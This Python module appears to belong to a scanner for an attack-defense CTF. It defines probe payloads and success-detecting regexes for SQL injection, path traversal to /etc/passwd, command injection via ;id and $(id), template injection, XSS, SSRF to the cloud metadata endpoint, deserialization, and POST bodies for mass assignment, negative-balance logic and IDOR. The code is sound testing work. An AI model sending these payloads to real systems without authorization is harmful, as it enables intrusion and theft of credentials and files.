"""Payload sets and detection markers.

One entry per bug class. Every payload is a read-only GET fragment: a value
that goes into a query string or a path segment. Nothing here changes server
state, deletes rows or calls the checker.

A payload is only useful with a marker. `marker` is the regex that proves the
payload did something; `compare` means "the response changed shape", which is
weaker evidence and is reported as such.
"""
from __future__ import annotations

from dataclasses import dataclass


@dataclass(frozen=True)
class Payload:
    label: str
    value: str
    marker: str | None = None
    compare: bool = False
    where: str = "query"          # query | path
    note: str = ""
    method: str = "GET"           # GET — по умолчанию; POST только по флагу
    body: str = ""
    content_type: str = "application/json"


SQL_ERROR = r"(?i)(sql syntax|unclosed quotation|sqlite3\.|sqlite error|SQLITE_ERROR|SQLITE_CONSTRAINT|mysql_fetch|pg_query|SQLSTATE|SequelizeDatabaseError|psycopg2\.|ODBC SQL Server|ORA-\d{5}|syntax error at or near)"
PASSWD = r"root:x:0:0:"
UID = r"uid=\d+\([a-z_][a-z0-9_-]*\)"


PAYLOADS: dict[str, tuple[Payload, ...]] = {
    "SQL injection": (
        Payload("quote-single", "'", SQL_ERROR, note="breaks out of a quoted literal"),
        Payload("quote-double", '"', SQL_ERROR, note="double-quoted literal"),
        Payload("backslash", "\\", SQL_ERROR, note="escapes the escape"),
        Payload("tautology", "1' OR '1'='1", note="boolean tautology; look at row count", compare=True),
    ),
    "Path traversal": (
        Payload("dotdot", "../../../../etc/passwd", PASSWD, note="plain traversal"),
        Payload("nested", "....//....//....//etc/passwd", PASSWD, note="filter strips ../ once"),
        Payload("encoded", "..%2f..%2f..%2f..%2fetc%2fpasswd", PASSWD, note="encoded separators"),
        Payload("absolute", "/etc/passwd", PASSWD, note="absolute path accepted"),
    ),
    "Local file inclusion": (
        Payload("dotdot", "../../../../etc/passwd", PASSWD, note="include from outside the root"),
        Payload("php-filter", "php://filter/convert.base64-encode/resource=index", r"^[A-Za-z0-9+/=\s]{40,}$", note="base64 wrapper"),
    ),
    "Command injection": (
        Payload("semicolon", ";id", UID, note="command separator"),
        Payload("pipe", "|id", UID, note="pipe"),
        Payload("subshell", "$(id)", UID, note="substitution"),
        Payload("backtick", "`id`", UID, note="backtick substitution"),
    ),
    "Server-side template injection": (
        Payload("jinja", "{{7*7}}", r"\b49\b", note="jinja2 / twig"),
        Payload("dollar", "${7*7}", r"\b49\b", note="freemarker / jsp el"),
        Payload("erb", "<%= 7*7 %>", r"\b49\b", note="erb / ejs"),
        Payload("ruby", "#{7*7}", r"\b49\b", note="ruby interpolation"),
    ),
    "Cross-site scripting": (
        Payload("tag", "\"><svg/onload=alert(1)>", r"<svg/onload=alert\(1\)>", note="unescaped reflection"),
        Payload("javascript", "javascript:alert(1)", r"javascript:alert\(1\)", note="href context"),
    ),
    "Open redirect": (
        Payload("scheme-relative", "//example.org", r"(?i)location:\s*(?:https?:)?//example\.org", where="query"),
        Payload("absolute-url", "https://example.org/", r"(?i)location:\s*https://example\.org", where="query"),
    ),
    "SSRF": (
        Payload("loopback", "http://127.0.0.1:{port}/", compare=True, note="server fetches itself"),
        Payload("metadata", "http://169.254.169.254/latest/meta-data/", r"(?i)(ami-id|instance-id|security-credentials)", note="cloud metadata"),
    ),
    "Remote code execution": (
        Payload("semicolon", ";id", UID, note="shell sink"),
        Payload("subshell", "$(id)", UID, note="substitution"),
    ),
    "Unsafe deserialization": (
        Payload("object", "rO0ABXNyAA==", r"(?i)(ClassNotFoundException|InvalidClassException|unpickling|unserialize\(\))", note="java serialization magic"),
        Payload("pickle", "gASV", r"(?i)(pickle|unpickling|invalid load key)", note="python pickle magic"),
    ),
}

# Нагрузки, которые пишут. Отправляются только при явном разрешении в интерфейсе:
# по умолчанию инструмент read-only, а запись в A/D — это то, что проверяет чекер.
POST_PAYLOADS: dict[str, tuple[Payload, ...]] = {
    "Mass assignment": (
        Payload("role", "", compare=True, method="POST", body='{"role":"admin"}',
                note="поле роли в теле: если ответ 200 и роль изменилась — mass assignment"),
        Payload("is-admin", "", compare=True, method="POST", body='{"isAdmin":true}',
                note="булев флаг прав в теле"),
        Payload("owner", "", compare=True, method="POST", body='{"userId":1}',
                note="владелец объекта из тела"),
    ),
    "Business logic: balance update": (
        Payload("negative", "", compare=True, method="POST", body='{"amount":-1000}',
                note="отрицательная сумма: баланс растёт вместо списания"),
        Payload("overflow", "", compare=True, method="POST", body='{"amount":999999999}',
                note="сумма без верхней границы"),
        Payload("string", "", compare=True, method="POST", body='{"amount":"1e9"}',
                note="строка вместо числа: приведение типа на сервере"),
    ),
    "Business logic: owner from request": (
        Payload("owner", "", compare=True, method="POST", body='{"username":"admin"}',
                note="владелец из тела запроса вместо сессии"),
    ),
    "IDOR / BOLA": (
        Payload("post-other-id", "", compare=True, method="POST", body='{"id":2}',
                note="тело POST с чужим id: маршрут меняет чужой объект"),
    ),
}

# Kinds that cannot be tested with one GET. The generator emits a scaffold
# instead of an active probe, and the UI says so.
MANUAL_ONLY = frozenset({
    "Mass assignment",
    "Unsafe upload",
    "JWT verification bypass",
    "Hardcoded secret",
    "Debug mode",
    "Checker reference",
    "Flag literal",
    "Business logic",
    "Unsafe C string function",
    "Unsafe memory copy",
    "Unhandled error",
    "Template escaping disabled",
})


def payloads_for(kind: str, method: str = "GET") -> tuple[Payload, ...]:
    if method == "POST":
        return POST_PAYLOADS.get(kind, ())
    return PAYLOADS.get(kind, ())


def is_probeable(kind: str) -> bool:
    """Проверяется GET-пробой. Запись сюда не входит: она за флагом."""
    return kind in PAYLOADS and kind not in MANUAL_ONLY


def is_post_probeable(kind: str) -> bool:
    return kind in POST_PAYLOADS
